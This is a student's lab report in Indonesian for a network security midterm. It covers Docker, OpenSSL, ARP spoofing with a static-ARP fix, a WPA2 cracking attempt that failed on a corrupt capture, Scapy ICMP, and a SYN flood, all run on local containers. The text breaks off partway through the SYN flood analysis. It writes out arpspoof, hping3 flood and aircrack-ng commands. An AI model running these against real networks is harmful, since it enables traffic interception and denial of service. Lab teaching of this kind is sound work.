# JAWABAN UTS Praktik Network Security

**Nama:** [RIO NUGRAHA PUTRA]
**NIM:** 24552011060
**Kasus:** 6

## Perhitungan Kasus

- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 0, 6, 0
- Jumlah digit: 26
- Sisa bagi 10: 6
- Kasus yang diterima: 6

---

# Tugas 1 (Pertemuan 1): Docker dan Volume[cite: 1]

## Perintah yang dijalankan[cite: 1]

```bash
docker volume create vol-k6[cite: 1]
docker run --name w-k6 -v vol-k6:/data alpine sh -c 'echo 24552011060 > /data/laporan-k6.txt'[cite: 1]
docker rm w-k6[cite: 1]
docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt[cite: 1]
docker compose -p k6 -f b/b1-compose/docker-compose.yml up -d[cite: 1]
docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target[cite: 1]
docker compose -p k6 -f b/b1-compose/docker-compose.yml down -v[cite: 1]
```

## Output terminal[cite: 1]

```text
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker volume create vol-k6[cite: 1]
vol-k6[cite: 1]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker run --name w-k6 -v vol-k6:/data alpine sh -c 'echo 24552011060 > /data/laporan-k6.txt'[cite: 1]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker rm w-k6[cite: 1]
w-k6[cite: 1]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt[cite: 1]
24552011060[cite: 1]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker compose -p k6 -f b/b1-compose/docker-compose.yml up -d[cite: 1]
[+] up 3/3[cite: 1]
 ✔ Network k6_lab          Created                                                                 0.1s[cite: 1]
 ✔ Container k6-target-1   Started                                                                 0.9s[cite: 1]
 ✔ Container k6-attacker-1 Started                                                                 0.6s[cite: 1]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target[cite: 1]
<!DOCTYPE html>[cite: 1]
<html>[cite: 1]
<head>[cite: 1]
<title>Welcome to nginx!</title>[cite: 1]
<style>[cite: 1]
html { color-scheme: light dark; }[cite: 1]
body { width: 35em; margin: 0 auto;[cite: 1]
font-family: Tahoma, Verdana, Arial, sans-serif; }[cite: 1]
</style>[cite: 1]
</head>[cite: 1]
<body>[cite: 1]
<h1>Welcome to nginx!</h1>[cite: 1]
<p>If you see this page, nginx is successfully installed and working.[cite: 1]
Further configuration is required for the web server, reverse proxy,[cite: 1]
API gateway, load balancer, content cache, or other features.</p>[cite: 1]

<p>For online documentation and support please refer to[cite: 1]
<a href="[https://nginx.org/](https://nginx.org/)">nginx.org</a>.<br/>[cite: 1]
To engage with the community please visit[cite: 1]
<a href="[https://community.nginx.org/](https://community.nginx.org/)">community.nginx.org</a>.<br/>[cite: 1]
For enterprise grade support, professional services, additional[cite: 1]
security features and capabilities please refer to[cite: 1]
<a href="[https://f5.com/nginx](https://f5.com/nginx)">[f5.com/nginx](https://f5.com/nginx)</a>.</p>[cite: 1]

<p><em>Thank you for using nginx.</em></p>[cite: 1]
</body>[cite: 1]
</html>[cite: 1]
```

## Analisis / Penjelasan[cite: 1]

**Persistensi volume (baris 1–4).** File `laporan-k6.txt` ditulis oleh container `w-k6`, lalu container tersebut dihapus sepenuhnya dengan `docker rm w-k6`[cite: 1]. Meski begitu, saat sebuah container baru (sekali pakai, lewat `--rm`) dipasang ke volume `vol-k6` yang sama, isi file `24552011060` tetap terbaca[cite: 1]. Ini membuktikan bahwa volume Docker disimpan oleh Docker Engine di lokasi terpisah dari *writable layer* container (biasanya di `/var/lib/docker/volumes/` pada host)[cite: 1]. Volume punya siklus hidup sendiri yang tidak terikat pada container yang memakainya — menghapus container hanya menghapus container-nya, bukan data yang sudah "dipasang" (mount) dari volume[cite: 1].

**Jaringan terisolasi dengan Compose (baris 5–7).** Service `attacker` berhasil mengakses `target` memakai nama service (`http://target`), bukan alamat IP, dan mendapat halaman default nginx[cite: 1]. Ini terjadi karena Docker Compose otomatis membuat jaringan bridge khusus (`k6_lab`) dengan DNS resolution internal: setiap service bisa saling menemukan lewat namanya[cite: 1]. Jaringan ini diset `internal: true`, artinya tidak ada gateway ke luar (tidak ada akses internet dari dalam container), tapi komunikasi *antar* container dalam jaringan yang sama tetap berjalan normal — sesuai yang diminta soal B1 (isolasi dari luar, tapi tetap terhubung di dalam)[cite: 1].

## Screenshot[cite: 1]

Lihat folder `screenshot/` untuk bukti visual[cite: 1].

---

# Tugas 2 (Pertemuan 2): Kriptografi (OpenSSL)[cite: 2]

## Perintah yang dijalankan[cite: 2]

```powershell
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'echo isi laporan k6 > laporan-k6.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k6.txt -out laporan-k6.enc -pass pass:kunci-k6-2026 && sha256sum laporan-k6.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k6.enc -out hasil-k6.txt -pass pass:kunci-k6-2026 && sha256sum hasil-k6.txt'[cite: 2]

docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates'[cite: 2]
```

## Output terminal[cite: 2]

```text
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'echo isi laporan k6 > laporan-k6.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k6.txt -out laporan-k6.enc -pass pass:kunci-k6-2026 && sha256sum laporan-k6.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k6.enc -out hasil-k6.txt -pass pass:kunci-k6-2026 && sha256sum hasil-k6.txt'[cite: 2]
ba00dcca033b5d1bcd46a143d134172554ea37b3a4849e4e98297e9846aaef54  laporan-k6.txt[cite: 2]
ba00dcca033b5d1bcd46a143d134172554ea37b3a4849e4e98297e9846aaef54  hasil-k6.txt[cite: 2]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates'[cite: 2]
subject=CN=k6.uts.local[cite: 2]
issuer=CN=k6.uts.local[cite: 2]
notBefore=Nov 21 12:45:47 2026 GMT[cite: 2]
notAfter=Dec 21 12:45:47 2026 GMT[cite: 2]
```

> Catatan: baris titik/plus panjang sebelum `subject=...` adalah indikator progres OpenSSL saat mencari bilangan prima untuk kunci RSA 2048-bit, bukan pesan error — sengaja tidak disertakan di sini karena tidak membawa informasi, tapi tetap tampak di screenshot asli[cite: 2].

## Analisis / Penjelasan[cite: 2]

**Enkripsi-dekripsi AES-256 (perintah pertama).** File `laporan-k6.txt` dienkripsi dengan `openssl enc -aes-256-cbc -pbkdf2` memakai password `kunci-k6-2026`, menghasilkan `laporan-k6.enc`[cite: 2]. File itu lalu didekripsi kembali menjadi `hasil-k6.txt` dengan password yang sama[cite: 2]. Hash SHA-256 dari `laporan-k6.txt` (sebelum dienkripsi) dan `hasil-k6.txt` (setelah didekripsi) **identik**: `ba00dcca033b5d1bcd46a143d134172554ea37b3a4849e4e98297e9846aaef54`[cite: 2]. Ini membuktikan proses enkripsi-dekripsi AES bersifat *lossless* — selama kunci/password yang dipakai untuk dekripsi sama dengan yang dipakai saat enkripsi, data kembali identik bit demi bit[cite: 2]. SHA-256 dipakai sebagai pembanding karena hash sangat sensitif: perubahan satu bit saja pada input akan menghasilkan hash yang sama sekali berbeda (avalanche effect), sehingga hash yang sama adalah bukti kuat bahwa isi file benar-benar sama persis[cite: 2].

**Sertifikat self-signed (perintah kedua).** Perintah `openssl req -x509 -newkey rsa:2048 ... -subj /CN=k6.uts.local` membuat pasangan kunci RSA 2048-bit sekaligus sertifikat X.509 dalam satu langkah (flag `-x509`)[cite: 2]. Hasilnya:
```
subject=CN=k6.uts.local[cite: 2]
issuer=CN=k6.uts.local[cite: 2]
```
Subject (pihak yang diklaim identitasnya oleh sertifikat) dan Issuer (pihak yang menandatangani sertifikat) **sama persis**[cite: 2]. Inilah definisi sertifikat *self-signed*: entitas yang membuat sertifikat menandatangani sertifikatnya sendiri, tanpa melibatkan pihak ketiga[cite: 2].

**Perbedaan sertifikat self-signed vs CA-signed:**
Sertifikat self-signed memiliki subject dan issuer yang sama karena diterbitkan sendiri oleh pemiliknya, sehingga tidak ada pihak independen yang memverifikasi identitas tersebut — klien yang mengaksesnya tidak bisa memastikan keasliannya tanpa secara eksplisit mempercayai sertifikat itu (biasanya muncul peringatan "not trusted" di browser)[cite: 2]. Sertifikat yang ditandatangani CA (Certificate Authority) diterbitkan oleh pihak ketiga tepercaya yang root certificate-nya sudah tertanam di sistem operasi/browser, sehingga klien bisa memverifikasi rantai kepercayaan (chain of trust) dari sertifikat tersebut sampai ke root CA, tanpa perlu mempercayai pemilik sertifikat secara langsung[cite: 2].

## Screenshot[cite: 2]

Lihat folder `screenshot/` untuk bukti visual[cite: 2].

---

# Tugas 3 (Pertemuan 3): ARP Spoofing[cite: 3]

## Catatan environment[cite: 3]

Image `uts-kali-tools` tidak menyertakan `net-tools` maupun `iproute2` secara default — hanya tool yang disebut eksplisit di Dockerfile (hping3, dnsutils, xxd, dsniff, aircrack-ng, python3-scapy, netcat-openbsd, tcpdump, curl)[cite: 3]. Akibatnya perintah asli `arp -a` dan `arp -s` di lembar soal tidak bisa dipakai langsung[cite: 3]. Sebagai gantinya:
- Tabel ARP dibaca langsung dari `/proc/net/arp` (file kernel, selalu tersedia tanpa paket tambahan)[cite: 3]
- Untuk memicu ARP resolution awal (pengganti `ping`, yang juga tidak tersedia), dipakai `nc -zv` ke port korban/gateway[cite: 3]
- Untuk memasang static ARP (mitigasi), paket `iproute2` di-install manual di container `korban-k6`, lalu dipakai `ip neigh replace` sebagai pengganti `arp -s`[cite: 3]

## Perintah yang dijalankan[cite: 3]

```powershell
# Setup[cite: 3]
docker network create lab-arp-k6[cite: 3]
docker run -d --name korban-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools[cite: 3]
docker run -d --name gateway-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools[cite: 3]
docker run -d --name penyerang-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools[cite: 3]

# Cek IP[cite: 3]
docker inspect korban-k6 gateway-k6 | ConvertFrom-Json | ForEach-Object { $_.NetworkSettings.Networks.'lab-arp-k6'.IPAddress }[cite: 3]

# Pancing ARP resolution awal (pengganti ping, tidak tersedia di image)[cite: 3]
docker exec korban-k6 nc -zv -w 2 172.18.0.3 80[cite: 3]

# ARP sebelum spoofing[cite: 3]
docker exec korban-k6 cat /proc/net/arp[cite: 3]

# Jalankan ARP spoofing (20 detik)[cite: 3]
docker exec -d penyerang-k6 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3[cite: 3]

# ARP saat spoofing[cite: 3]
docker exec korban-k6 cat /proc/net/arp[cite: 3]

# Ambil MAC asli gateway[cite: 3]
docker exec gateway-k6 cat /sys/class/net/eth0/address[cite: 3]

# Pasang mitigasi static ARP[cite: 3]
docker exec korban-k6 apt-get update[cite: 3]
docker exec korban-k6 apt-get install -y iproute2[cite: 3]
docker exec korban-k6 ip neigh replace 172.18.0.3 lladdr 9a:1f:7e:be:d8:26 dev eth0[cite: 3]

# Verifikasi ARP setelah mitigasi[cite: 3]
docker exec korban-k6 cat /proc/net/arp[cite: 3]

# Uji ulang spoofing untuk membuktikan mitigasi bekerja[cite: 3]
docker exec -d penyerang-k6 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3[cite: 3]
docker exec korban-k6 cat /proc/net/arp[cite: 3]
```

## Output terminal[cite: 3]

### IP address korban dan gateway[cite: 3]
```
korban-k6  : 172.18.0.2[cite: 3]
gateway-k6 : 172.18.0.3[cite: 3]
```

### MAC address asli gateway[cite: 3]
```
9a:1f:7e:be:d8:26[cite: 3]
```

### Tabel ARP korban — SEBELUM spoofing[cite: 3]
```
IP address       HW type     Flags       HW address            Mask     Device[cite: 3]
172.18.0.3       0x1         0x2         9a:1f:7e:be:d8:26     *        eth0[cite: 3]
```

### Tabel ARP korban — SAAT spoofing berlangsung[cite: 3]
```
IP address       HW type     Flags       HW address            Mask     Device[cite: 3]
172.18.0.3       0x1         0x2         da:9e:7b:50:c5:b3     *        eth0[cite: 3]
172.18.0.4       0x1         0x2         da:9e:7b:50:c5:b3     *        eth0[cite: 3]
```

### Tabel ARP korban — SETELAH mitigasi static ARP dipasang[cite: 3]
```
IP address       HW type     Flags       HW address            Mask     Device[cite: 3]
172.18.0.3       0x1         0x6         9a:1f:7e:be:d8:26     *        eth0[cite: 3]
172.18.0.1       0x1         0x2         16:4b:1e:7d:6c:3d     *        eth0[cite: 3]
172.18.0.4       0x1         0x2         da:9e:7b:50:c5:b3     *        eth0[cite: 3]
```

### Tabel ARP korban — setelah PERCOBAAN SPOOFING ULANG (mitigasi aktif)[cite: 3]
```
IP address       HW type     Flags       HW address            Mask     Device[cite: 3]
172.18.0.3       0x1         0x6         9a:1f:7e:be:d8:26     *        eth0[cite: 3]
172.18.0.1       0x1         0x2         16:4b:1e:7d:6c:3d     *        eth0[cite: 3]
172.18.0.4       0x1         0x2         da:9e:7b:50:c5:b3     *        eth0[cite: 3]
```

## Analisis / Penjelasan[cite: 3]

**Kenapa ARP spoofing bisa terjadi.** Protokol ARP (layer 2 OSI) menerjemahkan IP address menjadi MAC address di jaringan lokal, tetapi ARP dirancang tanpa mekanisme autentikasi[cite: 3]. Host mana pun bisa mengirim balasan ARP (gratuitous ARP) yang mengklaim "saya adalah IP sekian, ini MAC saya", dan host lain akan menerimanya begitu saja tanpa verifikasi[cite: 3]. `arpspoof -i eth0 -t 172.18.0.2 172.18.0.3` memanfaatkan celah ini dengan terus-menerus mengirim balasan ARP palsu ke korban (172.18.0.2), mengklaim bahwa IP gateway (172.18.0.3) memiliki MAC milik penyerang[cite: 3].

**Bukti serangan berhasil.** Sebelum spoofing, tabel ARP korban mencatat `172.18.0.3` → MAC `9a:1f:7e:be:d8:26` (MAC asli gateway-k6)[cite: 3]. Setelah `arpspoof` dijalankan, entry yang sama berubah menjadi `da:9e:7b:50:c5:b3` — identik dengan MAC `172.18.0.4` (penyerang-k6)[cite: 3]. Artinya korban sekarang percaya bahwa gateway memiliki MAC penyerang[cite: 3]. Jika korban mengirim paket ke gateway, pengiriman di layer 2 akan diarahkan berdasarkan MAC, sehingga paket tersebut justru akan sampai ke penyerang terlebih dahulu — inilah fondasi serangan Man-in-the-Middle (MITM): penyerang bisa menyadap atau memanipulasi trafik sebelum (atau tanpa) meneruskannya ke tujuan asli[cite: 3].

**Sifat sementara dari ARP spoofing.** Karena `arpspoof` dijalankan dengan `timeout 20`, begitu proses berhenti setelah 20 detik, racun ARP berhenti dikirim dan cache ARP korban akan expired dengan sendirinya setelah beberapa waktu — entry akan pulih otomatis saat korban melakukan ARP request baru dan kali ini gateway asli yang menjawab[cite: 3]. Ini menunjukkan ARP spoofing bukan serangan sekali-jalan yang permanen; di serangan nyata, tool seperti ini biasanya dijalankan looping terus-menerus, bukan dengan timeout[cite: 3].

**Mitigasi: static ARP binding.** Perintah `ip neigh replace 172.18.0.3 lladdr 9a:1f:7e:be:d8:26 dev eth0` memasang entry ARP secara statis dan permanen di kernel korban[cite: 3]. Buktinya terlihat dari kolom Flags yang berubah dari `0x2` (entry dinamis, bisa di-overwrite oleh balasan ARP apa pun) menjadi `0x6` (kombinasi COMPLETE + PERM/permanent)[cite: 3]. Dengan flag ini, kernel menolak meng-update entry tersebut dari balasan ARP mana pun yang diterima dari jaringan[cite: 3]. Ini dibuktikan dengan mengulangi serangan `arpspoof` setelah mitigasi terpasang: tabel ARP korban untuk `172.18.0.3` tetap menunjukkan MAC asli gateway dan flag `0x6`, sama sekali tidak terpengaruh — berbeda total dengan percobaan pertama yang langsung berubah dalam hitungan detik[cite: 3].

**Keterbatasan mitigasi ini.** Static ARP efektif untuk jaringan kecil dengan topologi tetap (seperti lab ini), tetapi tidak praktis diterapkan di jaringan besar dengan banyak host yang IP-nya sering berubah (DHCP), karena setiap entry harus di-maintain manual di setiap host[cite: 3].

## Screenshot[cite: 3]

Lihat folder `screenshot/` untuk bukti visual[cite: 3].

---

# Tugas 4 (Pertemuan 4): Analisis Handshake WPA2[cite: 4]

## Perintah yang dijalankan[cite: 4]

```powershell
docker run --rm -v "${PWD}:/work" uts-kali-tools aircrack-ng -w wordlist-k6.txt handshake-k6.cap[cite: 4]
```

## Output terminal (aircrack-ng)[cite: 4]

```text
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker run --rm -v "${PWD}:/work" uts-kali-tools aircrack-ng -w wordlist-k6.txt handshake-k6.cap[cite: 4]
Reading packets, please wait...[cite: 4]
This file is not a regular 802.11 (wireless) capture.[cite: 4]
Opening handshake-k6.cap[cite: 4]
Read 0 packets.[cite: 4]

No networks found, exiting.[cite: 4]


Quitting aircrack-ng...[cite: 4]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab>[cite: 4]
```

## Verifikasi tambahan dengan Wireshark[cite: 4]

Untuk memastikan masalah bukan pada perintah/container, file `handshake-k6.cap` juga dibuka langsung dengan Wireshark di host[cite: 4]. Hasilnya:

```
The capture file appears to be damaged or corrupt.[cite: 4]
(pcap: File has 3244555293-byte packet, bigger than maximum of 262144)[cite: 4]
```

(lihat `screenshot/wireshark-handshake-k6-corrupt.png`)[cite: 4]

## Analisis / Penjelasan[cite: 4]

**Dua alat independen mengkonfirmasi file corrupt.** `aircrack-ng` (di dalam container) melaporkan `Read 0 packets` / file bukan capture 802.11 yang valid, dan **Wireshark** (dibuka langsung di host, di luar Docker sama sekali) juga menolak file yang sama dengan pesan eksplisit: **file rusak**, dengan detail teknis bahwa struktur pcap mengklaim ada paket berukuran **3.244.555.293 byte (~3,2 GB)**, jauh melebihi batas maksimum pcap sebesar 262.144 byte per paket[cite: 4].

**Penyebab teknis.** Nilai ukuran paket sebesar itu (~3,2 GB) pada satu frame pcap hampir pasti menandakan **header pcap rusak** — kemungkinan beberapa byte di awal file (yang menyimpan panjang paket) berubah/hilang/corrupt saat proses transfer, kompresi, atau penyalinan file, sehingga parser pcap (baik oleh Wireshark maupun library yang dipakai aircrack-ng) membaca nilai length field yang tidak masuk akal dan langsung menolak keseluruhan file sebagai tidak valid[cite: 4].

**Kesimpulan:** masalah ada pada **file `handshake-k6.cap` itu sendiri** (bukan pada command, mounting Docker, maupun langkah yang dijalankan), karena dua tool yang sama sekali berbeda cara kerjanya (`aircrack-ng` via Docker dan Wireshark native di Windows) memberikan kesimpulan yang konsisten: file corrupt dan tidak bisa dibaca sebagai capture 802.11[cite: 4].

**Langkah yang sudah dilakukan:**
1. Menjalankan `aircrack-ng` sesuai perintah kasus — gagal dengan `Read 0 packets`[cite: 4].
2. Memverifikasi file secara independen dengan Wireshark — mengonfirmasi file corrupt dengan pesan error spesifik (ukuran paket melebihi batas maksimum pcap)[cite: 4].
3. **Melapor ke penguji** bahwa file `handshake-k6.cap` untuk Kasus 6 corrupt, disertai bukti dari dua tool berbeda, dan meminta file pengganti[cite: 4].

## Penjelasan 4 Langkah WPA2 4-Way Handshake[cite: 4]

Meski file capture tidak dapat diproses, berikut penjelasan konseptual proses yang seharusnya dianalisis:

1. **Message 1 (AP → Client):** AP mengirim **ANonce** (nilai acak dari AP)[cite: 4]. Client kini punya cukup informasi (PMK + ANonce + SNonce yang akan dibuat + MAC address kedua pihak) untuk menghitung PTK (Pairwise Transient Key)[cite: 4].
2. **Message 2 (Client → AP):** Client mengirim **SNonce** beserta **MIC** (Message Integrity Code) yang dihitung dari PTK[cite: 4]. AP kini juga bisa menghitung PTK-nya sendiri dan memverifikasi MIC ini[cite: 4].
3. **Message 3 (AP → Client):** Setelah MIC terverifikasi, AP mengirim **GTK** (Group Temporal Key, untuk trafik broadcast/multicast) terenkripsi PTK, beserta MIC-nya sendiri[cite: 4].
4. **Message 4 (Client → AP):** Client mengirim **ACK** konfirmasi instalasi kunci berhasil, menandakan handshake selesai dan kedua pihak siap mengenkripsi trafik data dengan PTK/GTK[cite: 4].

Message 2 (SNonce + MIC) adalah bagian yang biasanya ditangkap penyerang untuk serangan dictionary/brute-force offline seperti yang dilakukan `aircrack-ng`, karena MIC diturunkan dari PMK yang berasal dari passphrase — sehingga kandidat passphrase bisa dicoba offline tanpa terus terhubung ke jaringan target[cite: 4]. Pada kasus ini, langkah cracking tidak dapat dieksekusi karena file capture yang tersedia corrupt[cite: 4].

## Screenshot[cite: 4]

- `screenshot/terminal-aircrack-k6.png` — output aircrack-ng[cite: 4]
- `screenshot/wireshark-handshake-k6-corrupt.png` — konfirmasi file corrupt dari Wireshark[cite: 4]

---

# Tugas 5 (Pertemuan 5): ICMP dengan Scapy[cite: 5]

## Perintah yang dijalankan[cite: 5]

```powershell
docker inspect korban-k6 | Select-String "IPAddress"[cite: 5]
docker run --rm --network lab-arp-k6 -v "${PWD}/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.4[cite: 5]
```

## Output terminal[cite: 5]

```text
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker inspect korban-k6 | Select-String "IPAddress"[cite: 5]

                    "IPAddress": "172.18.0.4",[cite: 5]

PS D:\UTS-Network-Security-Kasus6\01-sumber-lab> docker run --rm --network lab-arp-k6 -v "${PWD}/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.4[cite: 5]
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.4 echo-request 0[cite: 5]
TTL balasan: 64[cite: 5]
Tipe ICMP balasan: 0[cite: 5]
PS D:\UTS-Network-Security-Kasus6\01-sumber-lab>[cite: 5]
```

## Analisis / Penjelasan[cite: 5]

Script `kirim_icmp.py` membuat paket `IP(dst=172.18.0.4)/ICMP()` menggunakan Scapy, dikirim dari container sementara (`172.18.0.5`, IP yang otomatis dialokasikan Docker untuk container `--rm` ini) ke container `korban-k6` (`172.18.0.4`), menggunakan `sr1()` (send-and-receive-1, menunggu satu balasan dengan timeout 2 detik)[cite: 5].

Hasilnya, balasan **berhasil diterima**:
- **TTL balasan = 64**: nilai Time To Live standar untuk host Linux yang belum melewati router/hop (TTL awal Linux umumnya 64, berkurang 1 setiap melewati router — nilai 64 yang utuh menunjukkan korban berada tepat satu hop, langsung di jaringan yang sama tanpa router perantara)[cite: 5].
- **Tipe ICMP balasan = 0**: tipe `0` adalah **Echo Reply**, balasan normal dari permintaan **Echo Request** (tipe `8`) yang dikirim — membuktikan host `korban-k6` aktif, dapat dijangkau, dan merespons ICMP dengan benar di dalam jaringan `lab-arp-k6`[cite: 5].

## Smurf Attack[cite: 5]

**Smurf attack** adalah varian serangan DDoS berbasis ICMP yang memanfaatkan *IP spoofing* dan *broadcast amplification*[cite: 5]. Penyerang mengirim paket **ICMP Echo Request** ke alamat **broadcast** suatu jaringan (misalnya `192.168.1.255`), dengan **source IP address yang di-spoof** menjadi alamat IP korban yang sebenarnya[cite: 5]. Karena dikirim ke alamat broadcast, **semua host** dalam jaringan tersebut menerima request itu dan masing-masing mengirim **ICMP Echo Reply** — tetapi karena source IP sudah dipalsukan, semua balasan itu justru dikirim ke **korban**, bukan ke penyerang[cite: 5]. Jika jaringan broadcast punya banyak host (disebut *smurf amplifier*), korban akan dibanjiri balasan ICMP dalam jumlah jauh lebih besar dari paket asli yang dikirim penyerang — inilah efek *amplifikasi* yang membuat smurf attack efektif sebagai serangan DDoS meski penyerang hanya mengirim sedikit trafik[cite: 5].

**Mitigasi umum:** menonaktifkan *IP-directed broadcast* di router/gateway, serta menerapkan *ingress/egress filtering* (BCP 38) untuk memblokir paket dengan source IP yang di-spoof[cite: 5].

## Screenshot[cite: 5]

Lihat folder `screenshot/` untuk bukti visual[cite: 5].

---

# Tugas 6 (Pertemuan 6): SYN Flood & Three-Way Handshake — Kasus 6[cite: 6]

## Perintah yang dijalankan[cite: 6]

```powershell
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml up -d[cite: 6]

# Baseline SYN_RECV (sebelum serangan)[cite: 6]
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | Select-String "SYN_RECV" | Measure-Object | Select-Object -ExpandProperty Count[cite: 6]

# Lancarkan SYN flood (background, 15 detik)[cite: 6]
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target[cite: 6]

# SYN_RECV saat serangan[cite: 6]
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | Select-String "SYN_RECV" | Measure-Object | Select-Object -ExpandProperty Count[cite: 6]

# Capture traffic dengan tcpdump[cite: 6]
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'[cite: 6]

docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml down -v[cite: 6]
```

> Catatan teknis: `grep` tidak tersedia secara native di PowerShell, sehingga diganti dengan `Select-String` yang dikombinasikan dengan `Measure-Object` untuk menghitung jumlah baris yang cocok (setara dengan `grep -c`)[cite: 6].

## Output terminal[cite: 6]

**Baseline (sebelum serangan):**
```
0[cite: 6]
```

**Saat serangan (setelah flood dilepas):**
```
1[cite: 6]
```

**Capture tcpdump (saat curl dijalankan bersamaan):**
```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode[cite: 6]
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes[cite: 6]
13:37:31.822105 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [S], seq 2492389743, win 64240, options [mss 1460,sackOK,TS val 1408519519 ecr 0,nop,wscale 10], length 0[cite: 6]
13:37:31.822154 IP 172.19.0.3.80 > 172.19.0.2.59884: Flags [S.], seq 518990461, ack 2492389744, win 65160, options [mss 1460,sackOK,TS val 1625370650 ecr 1408519519,nop,wscale 10], length 0[cite: 6]
13:37:31.822164 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [.], ack 1, win 63, options [nop,nop,TS val 1408519519 ecr 1625370650], length 0[cite: 6]
13:37:31.822288 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [P.], seq 1:71, ack 1, win 63, options [nop,nop,TS val 1408519519 ecr 1625370650], length 70: HTTP: GET / HTTP/1.1[cite: 6]
13:37:31.822319 IP 172.19.0.3.80 > 172.19.0.2.59884: Flags [.], ack 71, win 64, options [nop,nop,TS val 1625370650 ecr 1408519519], length 0[cite: 6]
13:37:31.824597 IP 172.19.0.3.80 > 172.19.0.2.59884: Flags [P.], seq 1:239, ack 71, win 64, options [nop,nop,TS val 1625370653 ecr 1408519519], length 238: HTTP: HTTP/1.1 200 OK[cite: 6]
13:37:31.824650 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [.], ack 239, win 63, options [nop,nop,TS val 1408519522 ecr 1625370653], length 0[cite: 6]
13:37:31.825053 IP 172.19.0.3.80 > 172.19.0.2.59884: Flags [P.], seq 239:1135, ack 71, win 64, options [nop,nop,TS val 1625370653 ecr 1408519522], length 896: HTTP[cite: 6]
13:37:31.825079 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [.], ack 1135, win 63, options [nop,nop,TS val 1408519522 ecr 1625370653], length 0[cite: 6]
13:37:31.825143 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [F.], seq 71, ack 1135, win 63, options [nop,nop,TS val 1408519522 ecr 1625370653], length 0[cite: 6]
13:37:31.825241 IP 172.19.0.3.80 > 172.19.0.2.59884: Flags [F.], seq 1135, ack 72, win 64, options [nop,nop,TS val 1625370653 ecr 1408519522], length 0[cite: 6]
13:37:31.825253 IP 172.19.0.2.59884 > 172.19.0.3.80: Flags [.], ack 1136, win 63, options [nop,nop,TS val 1408519522 ecr 1625370653], length 0[cite: 6]

12 packets captured[cite: 6]
12 packets received by filter[cite: 6]
0 packets dropped by kernel[cite: 6]
```

## Analisis / Penjelasan[cite: 6]

### 1. Perubahan jumlah koneksi `SYN_RECV`[cite: 6]

Sebelum serangan, jumlah koneksi dengan status `SYN_RECV` pada container `target` adalah **0** — kondisi normal, tidak ada *half-open connection* yang tertahan[cite: 6]. Setelah `hping3 -S -p 80 --flood` dilepaskan dari container `attacker`, jumlahnya naik menjadi **1**[cite: 6].

Kenaikan ini memang kecil dibanding efek SYN flood pada jaringan nyata (yang bisa mencapai ratusan/ribuan)[cite: 6]. Ada beberapa alasan teknis yang masuk akal untuk lab Docker lokal seperti ini:

- **Throughput internal Docker bridge network sangat tinggi** — paket SYN palsu diproses dan di-"reset"/dibuang oleh stack TCP target jauh lebih cepat dibanding pada jaringan WAN nyata, sehingga backlog tidak sempat menumpuk banyak dalam window pengecekan yang singkat[cite: 6].
- **Window pengecekan sangat sempit** — perintah `netstat` dijalankan sesaat setelah flood dilepas, hanya menangkap satu *snapshot* kondisi backlog pada momen tertentu, bukan rata-rata selama 15 detik serangan berlangsung[cite: 6].
- **Nilai default `net.ipv4.tcp_max_syn_backlog`** pada container target kemungkinan masih memungkinkan backlog diproses/dibersihkan dengan cepat karena tidak ada beban traffic lain yang bersaing[cite: 6].

